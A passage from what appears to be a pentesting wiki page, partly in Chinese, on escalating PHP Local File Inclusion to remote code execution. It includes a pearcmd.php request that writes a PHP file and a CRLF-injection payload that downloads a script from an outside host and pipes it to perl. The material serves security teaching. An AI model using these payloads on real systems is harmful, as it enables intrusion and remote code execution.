如果你发现了 **Local File Inclusion**，即使你 **没有 session** 且 `session.auto_start` 为 `Off`。如果在 **multipart POST** 数据中提供 **`PHP_SESSION_UPLOAD_PROGRESS`**，PHP 会为你 **启用 session**。你可以滥用这一点来获取 RCE：

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

如果你发现了 **Local File Inclusion** 且服务器运行在 **Windows** 上，你可能会得到 RCE：

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

下面这个请求会在 `/tmp/hello.php` 创建一个文件，内容为 `<?=phpinfo()?>`：
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
下面滥用一个 CRLF vuln 来获得 RCE（来自 [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)）：
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### 通过 phpinfo() (file_uploads = on)

如果你发现一个 **Local File Inclusion** 并且有一个暴露了 **phpinfo()** 且 **file_uploads = on** 的文件，你可以获得 **RCE**：

{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### 通过 compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

如果你发现一个 **Local File Inclusion** 并且你 **can exfiltrate the path** 临时文件的路径，BUT the **server** is **checking** if the **file to be included has PHP marks**，你可以尝试用这个 **Race Condition** 来 **bypass that check**：

{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### 通过 eternal waiting + bruteforce

如果你可以滥用 LFI 来 **upload temporary files** 并让服务器 **hang** PHP 执行，你就可以花数小时 **brute force filenames** 来找到临时文件：

{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### 导致 Fatal Error

如果你包含任意以下文件 `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`。（你需要包含相同的文件两次来抛出该错误）。

*I don't know how is this useful but it might be.*  
_即使你导致 PHP Fatal Error，PHP 上传的临时文件也会被删除。_

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## 参考

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
